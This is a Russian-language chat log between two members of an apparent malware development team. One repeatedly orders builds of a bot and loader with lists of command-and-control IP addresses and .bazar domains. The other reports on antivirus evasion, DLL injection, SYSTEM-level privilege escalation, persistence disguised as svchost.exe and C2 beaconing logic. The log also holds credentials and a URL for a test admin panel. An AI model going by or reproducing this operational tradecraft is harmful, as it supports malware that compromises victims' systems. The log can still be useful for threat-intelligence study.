адреса (домены) первого этапа
бот:
87.120.37.64
87.120.8.46
87.120.37.71
87.121.52.195

лоадер:
87.120.37.71
87.121.52.195
87.120.37.64
87.120.8.46


домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.12.21 12:09:07] collin:		направь wild
[07.12.21 12:09:17] geraldo:		Привет!
Принял
[07.12.21 13:30:09] collin:		сделай также сборку группа g4 - x64, regsvr32
[07.12.21 13:30:12] collin:		адреса и базары:
[07.12.21 13:30:21] collin:		```
адреса (домены) первого этапа
бот:
87.120.37.179
87.120.254.112
162.33.179.241
162.33.177.86

лоадер:
87.120.254.112
162.33.179.241
87.120.37.179
162.33.177.86

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.12.21 13:30:25] collin:		направь wild
[07.12.21 13:30:39] geraldo:		Принял
[08.12.21 10:19:11] collin:		Привет!
[08.12.21 10:19:17] collin:		как дела по таску 766?
[08.12.21 10:29:54] geraldo:		Привет!
Уже добавлен в сборки
[08.12.21 10:30:39] collin:		актуализируй данные в багтрекере тогда, отметь таски готовые
[13.12.21 07:41:06] collin:		Привет!
[13.12.21 07:41:14] collin:		насчет редмайна
[13.12.21 07:42:02] collin:		1) таск 480 - некоторое время назад проверял твою сборку на вин11, все работает корректно. Можешь закрыть таск, или что-то в рамках него еще делаешь?
[13.12.21 07:42:17] collin:		2) как успехи по таску 666?
[13.12.21 07:45:18] geraldo:		Привет!
В задаче 666 усечение сделал и количество итераций зафиксировал.
[13.12.21 07:46:35] geraldo:		Паузы ещё проверить хотел.
[13.12.21 07:47:49] geraldo:		В задаче 480 ничего не делаю пока. Хотел ещё некоторые команды потестировать.
[13.12.21 07:50:16] geraldo:		Сейчас с инъекцией dll-библиотеки (задача 663) разбираюсь и загрузчик нужно немного изменить, а то там с детектами проблемы.
Через раз компилируется с детектами.
[13.12.21 07:51:05] collin:		ок
[13.12.21 07:51:23] collin:		а что по таску 583?
[13.12.21 07:58:03] geraldo:		В лоадере шумовых запросов нет.
Модуль для отправки шумовых запросов сделан так, что выполняется внутри блока  "try except".
А лоадер не дружит с обработкой исключений, потому пока не добавил.
[13.12.21 07:58:53] geraldo:		Остальное по этой задаче сделано
[13.12.21 07:59:23] collin:		ну так допиши это в таске, через неделю опять я забуду и тоже самое стану спрашивать
[13.12.21 08:04:15] geraldo:		Хорошо. Дописал в примечании
[13.12.21 11:50:42] collin:		Сделай сборку
[13.12.21 11:51:03] collin:		группа g15, x64, rundll32(LoadDeviceA)
[13.12.21 11:51:25] collin:		```
адреса (домены) первого этапа
бот:
94.140.113.0
194.29.101.118
103.124.106.174

лоадер:
103.124.106.174
194.29.101.118
94.140.113.0

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[13.12.21 11:51:28] collin:		направь wild
[13.12.21 13:02:58] geraldo:		Принял
[14.12.21 14:26:38] collin:		Привет!
[14.12.21 14:27:24] collin:		за последнюю неделю я 4 раза передавал задачу на сборку которую хотел поручить тебе - другому кодеру
[14.12.21 14:27:38] collin:		по причине того что тебя нет онлайн, это в в рабочие дни в районе 14-16 мск
[14.12.21 14:27:54] collin:		так не годится
[14.12.21 14:28:17] collin:		нужно чтобы ты был днем в заранее известное время в сети, готовым принять и выполнить задачу
[14.12.21 14:28:24] collin:		с 13 до 17 мск, возможно другое время
[14.12.21 14:29:03] collin:		если с 13 до 17 не устраивает - определи сам когда ты онлайн и в какое время я могу на тебя рассчитывать
[14.12.21 14:29:33] collin:		в дневное время в диапазоне с 11 до 17 мск
[14.12.21 14:30:08] collin:		если какой-то день тебя нет в оговоренное время - заранее меня об этом ставь в известность
[14.12.21 14:30:46] collin:		я не первый раз уже поднимаю этот вопрос - по графику работы, почему одно и то же писать приходится постоянно
[14.12.21 14:42:16] geraldo:		Привет!
Вечером было бы удобнее (после 17:00).
Хорошо, буду с 13:00
[14.12.21 14:42:36] geraldo:		Думал, аврал закончился
[14.12.21 14:44:21] collin:		после 17 разовые заказы и редко бывают, всетаки в дневное время по москве нужно
[17.12.21 07:51:38] collin:		привет!
[17.12.21 07:51:44] collin:		сделай сборку группа g15
[17.12.21 07:51:56] collin:		x64, rundll32(CheckResource)
[17.12.21 07:52:04] collin:		```
адреса (домены) первого этапа
бот:
87.120.254.243
87.120.254.97
87.120.254.135
87.120.8.168

лоадер:
87.120.254.135
87.120.8.168
87.120.254.243
87.120.254.97

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.12.21 07:52:08] collin:		направь wild
[17.12.21 08:42:15] geraldo:		Привет!
Принял
[20.12.21 11:24:59] geraldo:		Привет!
Вопрос тут возник:
В задании сказано:
```
- сначала вызывается DllEntryPoint со спецификацией:
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
и fdwReason = DLL_PROCESS_ATTACH
- если DllMain возвращает TRUE - то вызывается экспорт-функция с точкой входа, спецификация функции:
int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);
``` 
Это из задачи по инъекции образа.
[20.12.21 11:25:22] geraldo:		Заголовок `int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);`
[20.12.21 11:25:50] geraldo:		Это же стандартный заголовок exe-файла.
[20.12.21 11:27:02] geraldo:		Экспортируемые функции же подобные заголовки имеют:
`__declspec(dllexport) int __stdcall StartFunc()`
[20.12.21 11:27:19] geraldo:		Хотя они, конечно, могут быть любыми.
[20.12.21 11:28:12] geraldo:		Так и должно быть?
[20.12.21 11:28:43] collin:		Привет!
[20.12.21 11:29:02] collin:		да экспорт-функция в нагрузке будет с `__declspec(dllexport)` конечно объявлена
[20.12.21 11:29:29] collin:		но в текущем контексте это не принципиально
[20.12.21 11:29:45] collin:		ты ищешь адрес нужной функции потом ее вызываешь и передаешь нужное количество параметров в нужной последовательности
[20.12.21 11:30:33] geraldo:		Это то понятно. А почему аргумента четыре?
[20.12.21 11:30:34] collin:		т.е. прототип переменной-функции тут только играет роль
[20.12.21 11:31:15] collin:		это стандартное объявление для функций, которые вызываются с помощью rundll32
[20.12.21 11:32:00] collin:		по факту мы параметров не передаем, тут имеется ввиду сколько данных в стеке выделяется
[20.12.21 11:32:32] collin:		для корректной отработке и возврата из функции, если из нее выход по return а не ExitThreads()/ExitProcess()
[20.12.21 11:38:54] geraldo:		Всё, понял.
Дошло))) Спасибо)
[20.12.21 11:39:44] collin:		ну ив дальнейшем возможно придется передавать какието параметры, hInst например - с базовым адресом развертывания образа нагрузки
[20.12.21 11:39:57] collin:		пока это не оговаривалось, практика покажет
[20.12.21 11:40:05] collin:		сейчас все нулями достаточно будет передать
[20.12.21 11:42:32] geraldo:		Передачу дескриптора hInst сделаю. Это нетрудно.
[20.12.21 11:45:19] collin:		сделай сборку
[20.12.21 11:45:30] collin:		группа g4, x64, regsvr32
[20.12.21 11:45:35] collin:		```
адреса (домены) первого этапа
бот:
31.13.195.154
31.13.195.140
31.13.195.126
87.120.8.117

лоадер:
87.120.8.117
31.13.195.140
31.13.195.154
31.13.195.126

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.12.21 11:45:39] collin:		направь wild
[20.12.21 11:46:04] geraldo:		Принял
[21.12.21 13:03:54] collin:		Привет!
[21.12.21 13:04:03] collin:		сделай сборку группа g4
[21.12.21 13:04:06] collin:		x64, regsvr32
[21.12.21 13:04:13] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.176
103.208.86.177
103.208.86.179
103.208.86.182

лоадер:
103.208.86.179
103.208.86.182
103.208.86.176
103.208.86.177

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[21.12.21 13:04:15] collin:		направь wild
[21.12.21 13:09:21] geraldo:		Привет! Принял
[22.12.21 09:48:28] collin:		Привет!
[22.12.21 09:48:47] collin:		1) не откладывай 666 таск в долгий ящик, добей его в ближайшее время
[22.12.21 09:48:51] collin:		2) как успехи по 663?
[22.12.21 09:53:20] collin:		663 - процент готовности, как оцениваешь сколько времени на него еще надо?
[22.12.21 10:26:50] geraldo:		Привет!
По задаче 663 процентов на 70 готовность. Сейчас только ею и занимаюсь.
[22.12.21 10:27:33] geraldo:		Хотел до нового года уже её сделать. Хотя бы на этап тестирования её перевести
[22.12.21 15:27:46] collin:		Привет!
[22.12.21 15:27:56] collin:		Обстоятельства вынуждают снова изменить приоритет доработок БК
[22.12.21 15:28:31] collin:		если за эту неделю таск 663 не доделаешь - то ставь его на паузу
[22.12.21 15:29:10] collin:		и делай в первую очередь 476 и 798
[22.12.21 15:29:24] collin:		обрати внимание в 476 я формулировку ТЗ поменял
[22.12.21 15:31:38] geraldo:		Хорошо, увидел
[23.12.21 08:07:42] collin:		Привет!
[23.12.21 08:07:46] collin:		сделай сборку группа g4
[23.12.21 08:07:49] collin:		x64, regsvr32
[23.12.21 08:07:56] collin:		```
адреса (домены) первого этапа
бот:
94.140.114.201
176.103.58.142
5.135.255.247
192.119.93.26

лоадер:
5.135.255.247
192.119.93.26
94.140.114.201
176.103.58.142

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[23.12.21 08:08:00] collin:		направь wild
[23.12.21 08:09:40] geraldo:		Привет!
Принял
[30.12.21 13:25:01] collin:		Привет!
[30.12.21 13:25:09] collin:		завтра и на следующей неделе задач по БК не будет
отдыхай или работай в свободном графике
в штатном режиме выходи на работу с 10 января
по возможности с 4 января каждый день проверяй рабочие чаты, на предмет важных сообщений
[30.12.21 13:27:56] geraldo:		Привет!
Хорошо. Буду на связи.
[11.01.22 06:56:57] collin:		Привет!
[11.01.22 06:57:31] collin:		по багтрекеру:
[11.01.22 06:57:41] collin:		1) напиши текущий статус по таскам 480, 498
[11.01.22 06:58:07] collin:		2) какой статус/план работ по таскам 798, 476?
[11.01.22 07:20:15] geraldo:		Привет!
По задаче 498 - русский язык в загрузчике в отладочных сообщениях везде заменён на английский, в боте - ещё не везде.
[11.01.22 07:23:05] geraldo:		По задаче 480 хотел ещё проверить некоторые команды (11 3, например).
[11.01.22 07:25:23] geraldo:		По задаче 798 пока не получается. Если запускать бот как дочерний процесс от браузера, то права администратора не наследуются. Наследуются права браузера (middle process). Как это исправить, пока не понятно.
[11.01.22 07:28:39] geraldo:		К задаче 476 ещё не приступал. Точнее в интернете только смотрел, какая есть информация по этому поводу.
[11.01.22 07:29:27] geraldo:		В задаче 476 нужно сделать, чтобы БК работал как служба Windows?
[11.01.22 07:30:19] collin:		как служба не обязательно
[11.01.22 07:30:59] collin:		главное корректная работа и наследование прав
[11.01.22 07:31:49] collin:		то есть нужно запустить с правами LOCAL SYSTEM и убедится что все корректно работает
[11.01.22 07:32:01] collin:		запустить - например через задачу в планировщике с опцией "запуск от системы"
[11.01.22 07:32:44] collin:		royal недавно это у себя проверял, можешь с ним проконсультироваться
[11.01.22 07:33:07] collin:		в части BITS сложностей нет - там права на задачу всегда наследуются он писал
[11.01.22 07:34:55] collin:		`сли запускать бот как дочерний процесс от браузера, то права администратора не наследуются.` - есть такое, тут два варианта
[11.01.22 07:35:15] collin:		1) для такой ситуации инжектиться в другой процесс, не браузер
[11.01.22 07:36:14] collin:		2) разобраться как стартовать процесс браузера в High integration, вероятно есть решение. Также Роял занимался этим вопросом, уточни у него получилось ли сделать
[11.01.22 07:45:04] geraldo:		Хорошо. Я попозже на связь выйду. Через пару часов.
[11.01.22 08:01:32] collin:		`Другой процесс использую, браузер с админскими правами палевно смотрится.` - Роял написал, делай так же
[11.01.22 08:02:36] collin:		ну только через проверку для случая если свой процесс High integration, если свой без поднятых привилегий - то стратегия маскировки как раньше
[11.01.22 11:35:03] geraldo:		Уточнить хотел по поводу поиска командного сервера.
Сейчас сделано так:
```
for (r = 1; r <= 75; r++)
{
	if (r == 75)
	{
		Завершение процесса
	}
	for (i=0;i < 3; i++)
	{
		проход по всем сырым адресам;
		пауза 1 минута
		проход по всем bazar-адресам
		пауза 1 минута
	}
	проход по всем 128 DGA-адресам
	если r <> 1 сделать получасовую паузу
}
```
[11.01.22 11:35:25] geraldo:		Так можно оставить?
[11.01.22 11:46:56] collin:		`проход по всем сырым адресам` - тут по одной попытке проход получается?
[11.01.22 11:57:46] geraldo:		Да, по одной попытке к каждому ip-адресу
[11.01.22 11:59:30] geraldo:		Но это же делается в цикле из 3 итераций. Получается, всего 3 попытки подключения к каждому ip-адресу.
[11.01.22 12:05:43] collin:		оставляй пока так, все равно там предстоит модификация в ближайшем будущем
[11.01.22 12:07:35] geraldo:		Хорошо, спасибо
[13.01.22 10:41:22] collin:		Привет!
[13.01.22 10:41:23] collin:		сделай сборку
[13.01.22 10:41:33] collin:		g15, rundll32(freebm), x64
[13.01.22 10:41:51] collin:		```
адреса (домены) первого этапа
бот:
91.234.254.127
5.255.96.16
194.147.115.7
84.32.188.182

лоадер:
194.147.115.7
84.32.188.182
91.234.254.127
5.255.96.16

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[13.01.22 10:41:55] collin:		направь wild
[13.01.22 10:46:42] geraldo:		Привет! Принял
[14.01.22 13:08:13] geraldo:		Привет! Я примерно в 18:00 на связь выйду
[17.01.22 11:51:04] collin:		Привет!
[17.01.22 11:51:07] collin:		сделай сборку
[17.01.22 11:51:10] collin:		g15 rundll32(vinc), x64
[17.01.22 11:51:19] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.147
103.208.86.105
194.38.20.11
5.181.80.177

лоадер:
194.38.20.11
5.181.80.177
45.41.204.147
103.208.86.105

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.01.22 11:51:22] collin:		направь wild
[17.01.22 11:54:30] geraldo:		Привет!
Принял
[17.01.22 11:54:59] collin:		и еще сделай сборку группа 57
[17.01.22 11:55:12] collin:		rundll32(dopt), x64
[17.01.22 11:55:16] collin:		адреса другие:
[17.01.22 11:55:29] collin:		```
адреса (домены) первого этапа
бот:
188.127.251.106
194.147.115.132
91.201.202.219
194.38.20.30

лоадер:
91.201.202.219
194.147.115.132
194.38.20.30
188.127.251.106

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.01.22 11:55:37] collin:		направь wild
[17.01.22 11:55:44] geraldo:		Принял
[17.01.22 13:37:19] collin:		как дела, все выдал?
[17.01.22 13:37:37] geraldo:		Так точно)
[18.01.22 08:02:22] collin:		привет!
[18.01.22 08:02:26] collin:		как успехи по доработкам?
[18.01.22 08:05:32] geraldo:		Привет!
Разбираюсь с привилегиями и закреплением.
[18.01.22 08:06:49] collin:		есть сложности?
[18.01.22 08:08:55] geraldo:		Да пока непонятно. Вроде перезапуск с высоким уровнем привилегий работает, если не наследоваться от браузера.
[18.01.22 08:09:57] collin:		начни с простого, не используй браузер при работе от системы и в High Integration
[18.01.22 08:25:50] collin:		я перевел все таски которые не приоритетны на данный момент в статус "Отложено". Не бери в работу новых задач пока текущие не закроешь
[18.01.22 08:26:16] geraldo:		Хорошо
[20.01.22 07:16:40] collin:		привет!
[20.01.22 07:16:45] collin:		сделай сборку
[20.01.22 07:17:06] collin:		g15 rundll32(SwitchBasicMode), x64
[20.01.22 07:17:11] geraldo:		Привет!
[20.01.22 07:17:15] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.245
188.127.251.111
23.160.193.119
80.71.158.22

лоадер:
23.160.193.119
80.71.158.22
103.208.86.245
188.127.251.111

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.01.22 07:17:19] collin:		направь wild
[20.01.22 07:17:22] geraldo:		Принял
[20.01.22 11:48:47] collin:		сделай еще сборки x64:
[20.01.22 11:48:56] collin:		группа 23 rundll32(selectnode)
группа 23 generic
[20.01.22 11:48:59] collin:		адреса и базары те же
[20.01.22 11:49:01] collin:		направь wild
[20.01.22 11:49:24] geraldo:		Принял
[21.01.22 13:08:20] geraldo:		Привет! Я отойду на пару часов. После 18:00 выйду на связь.
[21.01.22 13:16:12] collin:		привет ок
[24.01.22 10:43:10] collin:		привет!
[24.01.22 10:43:19] collin:		сделай сборку группа g15 generic
[24.01.22 10:43:20] collin:		x64
[24.01.22 10:43:26] collin:		```
адреса (домены) первого этапа
бот:
87.120.8.179
87.120.254.33
87.120.37.114
87.120.8.198

лоадер:
87.120.37.114
87.120.8.198
87.120.8.179
87.120.254.33

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[24.01.22 10:43:31] collin:		направь wild
[24.01.22 11:09:30] geraldo:		Привет!
Принял
[25.01.22 10:32:45] collin:		привет!
[25.01.22 10:32:50] collin:		как дела по доработкам?
[25.01.22 10:36:33] geraldo:		Привет!
Сделал маскировку под svchost.exe при запуске с повышенными привилегиями. Закрепляется в системе тоже с высокими привилегиями.
[25.01.22 10:38:18] geraldo:		Поиск другой папки для сохранения временных файлов (как в задании написано) ещё не сделал.
[25.01.22 10:39:15] geraldo:		У меня возник статический детект на AV Avira.
На прошлой неделе вроде бы его добил. А вчера он опять появился.
[25.01.22 10:40:26] geraldo:		Для режимов rundll32 и generic(exe)  его нет. А вот в dll в режиме generic есть.
[26.01.22 11:48:55] collin:		Привет!
[26.01.22 11:49:03] collin:		сделай сборку x64 generic-glue для своей тестовой группы
[26.01.22 11:49:09] collin:		```
адреса (домены) первого этапа
бот:
23.160.193.16
23.160.193.38
172.96.189.86
194.40.243.76

лоадер:
194.40.243.76
23.160.193.16
23.160.193.38
172.96.189.86

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[26.01.22 11:49:21] geraldo:		Привет!
[26.01.22 11:49:21] collin:		направь biggie в этом чате
[26.01.22 11:50:17] geraldo:		Аргумент какой (/probe_no_soft)?
[26.01.22 11:53:05] collin:		давай /test20220126
[26.01.22 11:53:17] geraldo:		Принято
[26.01.22 13:34:44] geraldo:		Сборку отправил Biggie.
[26.01.22 13:35:14] collin:		ок
[31.01.22 07:28:19] collin:		Привет!
[31.01.22 07:28:22] collin:		как успехи по доработкам
[31.01.22 07:28:30] collin:		таски 476, 798
[31.01.22 07:28:32] collin:		?
[31.01.22 08:42:53] collin:		пинг
[31.01.22 10:08:30] geraldo:		Привет!
[31.01.22 10:09:56] collin:		Привет!
[31.01.22 10:09:59] collin:		сделай сборки:
[31.01.22 10:10:09] collin:		g15 generic
23 rundll32(setscreen)
[31.01.22 10:10:11] collin:		x64
[31.01.22 10:10:31] collin:		```
адреса (домены) первого этапа
бот:
185.14.31.205
45.89.127.63
104.168.48.120
185.99.132.67

лоадер:
104.168.48.120
185.99.132.67
185.14.31.205
45.89.127.63

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[31.01.22 10:10:35] collin:		направь wild
[31.01.22 10:11:13] geraldo:		По задаче 476 закрепление и работа с высокими привилегиями сделаны. Целевые папки только ещё не изменил.
[31.01.22 10:12:26] geraldo:		С детектами возился много на прошлой неделе. АВ Avira проблемы создаёт.
[31.01.22 10:13:01] collin:		сейчас остались детекты?
[31.01.22 10:13:15] collin:		ну сборки в любом случае делай, даже если детект будет
[31.01.22 10:13:38] geraldo:		Сейчас проверю обязательно
[31.01.22 11:04:55] geraldo:		Сборки отправил.
64-разрядные dll-файлы на dyncheck'е чистые.
[31.01.22 11:05:53] collin:		ок
[31.01.22 13:33:29] geraldo:		После 18:00 выйду на связь
[01.02.22 10:43:13] collin:		```
Привет!
Нужно организовать связь в сети Tox. Сейчас как резервный канал, в дальнейшем возможно он станет основным.
1. Скачай и установи клиент сети Tox (например qTox). Заведи новый профиль под рабочий аккаунт, если еще нет. Пропиши в профиле ник КАК В ЭТОМ РОКЕТЕ. И скинь мне свой Tox ID.
2. В настройках клиента убедись, что соединение осуществляется через сеть Tor.
3. Добавься ко мне в контакты, мой ID: 8201462924F7963A54ABADC532504AED61F6D60DFFF2BE2FC63DD2D41A3FF73C1C6136DFD244
срок - до конца этой недели
подтверди
```
[01.02.22 10:45:14] geraldo:		Привет!
Принял
[02.02.22 11:36:30] geraldo:		Привет!
Это мой Tox ID:
```
3E1351ECBCC58A0866AA1947AAF94C0A83DA744E57B83952863439851375B809BF64BA1548EE
```
[02.02.22 11:38:17] collin:		+
[03.02.22 10:25:02] collin:		Привет!
[03.02.22 10:25:06] collin:		`https://privnote.com/A31Jric2#S48FnpG8Z`
[03.02.22 10:25:10] collin:		подтверди получение и расшифровку
[03.02.22 10:53:44] geraldo:		Привет! Логин и пароль что-то не могу найти свой(
[03.02.22 10:53:56] geraldo:		От тестовой админки
[03.02.22 10:55:11] collin:		```
b8
Cd6ND7k%Nd7jEN3J%Nd
```
[03.02.22 10:55:15] collin:		креды от тестовой
[03.02.22 10:55:22] collin:		`https://217.12.204.65/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/`
[03.02.22 10:57:18] geraldo:		Спасибо
[03.02.22 11:09:38] geraldo:		В общем, у меня не воспроизводится проблема на тестовой админке. Боты перенеслись нормально в другой раздел.
Но у меня была тоже такая проблема раньше. Не мог переводить своих ботов в тестовые
[03.02.22 11:10:59] geraldo:		Версия браузера:
11.0.4 (based on Mozilla Firefox 91.5.0esr) (64 бита)
[03.02.22 11:12:18] collin:		+
[03.02.22 15:42:42] collin:		```
https://privatlab.com/s/v/6GyVlM6EW5s2YbL9Gw3O

памятка по информационной безопасности (.gpg файл)
изучи, применяй в работе
```
[03.02.22 15:48:01] geraldo:		Пригял
[07.02.22 10:23:40] collin:		привет!
[07.02.22 10:23:45] collin:		как успехи по доработкам?
[07.02.22 10:27:15] geraldo:		Привет!
Да пока без изменений. Изменение целевой папки при сохранении временных файлов ещё не сделано (при работе с высокими привилегиями). Закрепление с высоким приоритетом работает вроде бы нормально.
[07.02.22 10:27:48] collin:		в чем сложность и заминка?
[07.02.22 10:27:57] collin:		ты очень долго с этими тасками возишься уже
[07.02.22 10:29:22] geraldo:		Сложности нет. В ближайшее время сделаю.
[07.02.22 10:29:46] collin:		скинь мне отчет в свободной форме
[07.02.22 10:29:52] collin:		что за последнюю неделю делал
[07.02.22 10:30:10] collin:		сегодня до конца дня
[07.02.22 10:31:27] collin:		также актуализируй таски в редмайне - по каждому со статусом "в работе" + 798 + 476 - допиши текущий уровень готовности, затраченное уже время на таск, сколько времени осталось
[07.02.22 10:31:48] collin:		также актуализируй проект в гит включая файлы RELEASE_NOTES*
[07.02.22 10:31:58] collin:		мне нужно понимание почему так долго процесс идет
[07.02.22 10:32:33] collin:		я специально целую неделю сборок боевых тебе не давал в надежде что таски двинуться, нод вижения нет..
[07.02.22 12:45:39] geraldo:		На прошлой неделе правил загрузчик. Чтобы устранить детект, пришлось смотреть в отладчике, какие ещё остались ссылки на сегменты данных и убирать их. Всё, что сделано на gitlab загрузил на прошлой неделе. Ещё сделал, чтобы некоторые функции при выполнении эмулятором зацикливались и написал отдельную подпрограмму для разблокировки зацикливания.
[07.02.22 12:46:23] geraldo:		Не знаю, поможет или это или нет, но уже не знаю что против детектов придумать
[07.02.22 12:46:45] collin:		а с каким детектом борешься?
[07.02.22 12:54:10] geraldo:		После последней правки загрузчика в 64-разрядной версии пока нет детектов. Только что проверил, пока чисто.
[07.02.22 12:54:43] geraldo:		В 32-разрядной только черным-черно всё на динчеке
[07.02.22 12:56:49] collin:		32 откладывай, она пока не нужна
[07.02.22 12:57:02] collin:		планируем полностью отказаться от 32, только 64 дальше вести
[07.02.22 13:32:19] geraldo:		Сейчас потестировал работу с высоким уровнем привилегий. Самокопирование сделал в папку %programdata%, сохранение временных файлов в папку Temp.
Закрепление работает нормально.
[07.02.22 13:32:56] geraldo:		Две последние задачи переведу пока в статус "Тестирование"
[07.02.22 13:43:41] collin:		+
[08.02.22 13:39:52] collin:		Привет!
[08.02.22 13:40:10] collin:		добавил таск 851, он самый срочный, делай в первую очередь
[08.02.22 13:40:12] collin:		```
C8m%Ndk4na&KD#&Kfdmr9l)Dney
https://privatlab.com/s/v/r7DJe66WW2tjokBDgZpj
```
[08.02.22 13:40:15] collin:		материалы к таску
[08.02.22 13:40:18] collin:		подтверди получение
[08.02.22 14:02:56] geraldo:		Привет!
Принял
[10.02.22 09:15:59] collin:		Привет!
[10.02.22 09:16:19] collin:		добавил два таска в редмайн 854 и 860
[10.02.22 09:16:33] collin:		тоже срочные - как закончишь с 851, начинай делать их
[10.02.22 09:17:23] geraldo:		Привет!
Принял
[11.02.22 14:35:51] collin:		привет!
[11.02.22 14:36:04] collin:		поправил таск 860 - надо добавить параметр domain - в флаг 1 "General Info", обрати внимание
[11.02.22 14:36:51] geraldo:		Привет! Хорошо
[14.02.22 08:42:25] collin:		привет!
[14.02.22 08:42:32] collin:		сделай сборку группа g15
[14.02.22 08:42:51] collin:		rundll32(assaic)
[14.02.22 08:42:58] collin:		```
адреса (домены) первого этапа
бот:
45.128.149.42
137.74.104.103
5.2.67.108
80.92.204.176

лоадер:
5.2.67.108
80.92.204.176
45.128.149.42
137.74.104.103

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.02.22 08:43:01] collin:		направь wild
[14.02.22 08:43:07] geraldo:		Привет!
Принял
[14.02.22 08:44:43] collin:		продублируй сборку эту также odis
[14.02.22 08:44:59] geraldo:		Хорошо
[15.02.22 11:50:23] geraldo:		Привет!
Сейчас будем делать сборки? Хотел отлучиться до вечера.
[15.02.22 11:52:41] collin:		Привет!
[15.02.22 11:52:54] collin:		пока тишина
[15.02.22 11:52:58] collin:		заказов нет
[15.02.22 11:53:04] collin:		отлучись
[15.02.22 11:53:25] geraldo:		Спасибо. После 18:00 выйду на связь
[15.02.22 11:53:34] collin:		+
[15.02.22 16:00:20] collin:		```
X6ndHN(K4nDJ%Nd7kFN5k8Beg
https://privatlab.com/s/v/EJWr4Ny280Iwxd2AB5Z5
https://privatlab.com/s/d/EJWr4Ny280Iwxd2AB5Z5/qjjMg#delete
```
[15.02.22 16:00:34] collin:		нашли проблему с твоей сборкой, на win7 не работает корректно
[15.02.22 16:00:37] collin:		это логи запуска
[15.02.22 16:00:56] collin:		добавил таск 872 - сверхсрочно нужно это исправить
[15.02.22 16:01:02] collin:		подтверди получение файла и задачи
[15.02.22 16:11:28] geraldo:		Принял. Посмотрю.
Судя по логам, бот запускается. Он не стучался?
[15.02.22 16:12:00] collin:		в итоге отстучал но больше получаса при рабочих адресах, такое
[15.02.22 16:12:38] collin:		над днях Роял фиксил проблему с запросами на 7 и 8 винде, у него с доп.хедерами в wininet проблема была
[15.02.22 16:12:51] collin:		переговори, может у тебя похожая ситуация
[15.02.22 16:16:31] geraldo:		Хорошо
[17.02.22 09:28:47] collin:		привет!
[17.02.22 09:28:50] collin:		сделай сборку
[17.02.22 09:29:02] collin:		g15 rundll32(CompleteStateA)
[17.02.22 09:29:12] collin:		с автозакрепом с режимом самокопирования при автозакрепе
[17.02.22 09:29:40] collin:		```
адреса (домены) первого этапа
бот:
185.219.220.123
185.158.248.240
194.76.224.142
185.158.249.150

лоадер:
194.76.224.142
185.158.248.240
185.219.220.123
185.158.249.150

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.02.22 09:29:45] collin:		направь wild
[17.02.22 09:31:19] geraldo:		Привет! Принял
[17.02.22 12:50:45] collin:		сделай еще сборку группа soc1
[17.02.22 12:50:48] collin:		rundll32(bscvla)
[17.02.22 12:51:06] collin:		```
адреса (домены) первого этапа
бот:
185.150.117.116
172.96.188.72
45.131.66.226
23.160.193.137

лоадер:
45.131.66.226
23.160.193.137
185.150.117.116
172.96.188.72

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.02.22 12:51:10] collin:		направь wild
[17.02.22 13:42:26] geraldo:		Принял
[21.02.22 09:49:44] geraldo:		Привет!
По задачам:
1. Спецификации точек входа проверил.
2. Команду 1 SystemInfo изменил, но не протестировал ещё. В админке не нашёл поле, где флаги задавать. Наверное, ещё нет его.
[21.02.22 09:50:23] collin:		это на 65 - там пока не доделано, но флаги в билдере команд можно ставить
[21.02.22 09:52:28] geraldo:		На ОС Windows 7 проверил, стучит нормально. Все сборки, которые делал на прошлой неделе проверил на ВМ, поставленной заново.
Всё отрабатывало нормально (длинных задержек не было).
[21.02.22 09:52:49] collin:		понял перепроверим тогда еще раз
[21.02.22 09:53:27] collin:		сделай сборку группа 40 generic
[21.02.22 09:53:36] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.141
188.127.231.76
45.41.204.10
5.252.177.62

лоадер:
45.41.204.10
5.252.177.62
103.208.86.141
188.127.231.76

домены второго этапа, бот и лоадер:
(нет)
```
[21.02.22 09:53:40] collin:		направь мне
[21.02.22 09:54:04] collin:		дальше опять меняю приоритет по таскам) 854 - пока не срочно
[21.02.22 09:55:22] collin:		в первую очередь сделай 596, затем добей 583 (шумовые запросы в лоадере) - это обязательно нузжно для слудующего протокола
[21.02.22 09:56:34] geraldo:		Принято
[21.02.22 10:46:19] geraldo:		Готово!
```
https://privatlab.com/s/v/9mo6nLm9pAuwgpBRO2q9
https://privatlab.com/s/d/9mo6nLm9pAuwgpBRO2q9/7roR4#delete
```
[21.02.22 10:49:53] collin:		+
[21.02.22 10:51:07] collin:		в среду 23 февраля нужно твое присутствие и готовность собрать БК
[21.02.22 10:51:18] collin:		днем с 11 до 17 мск
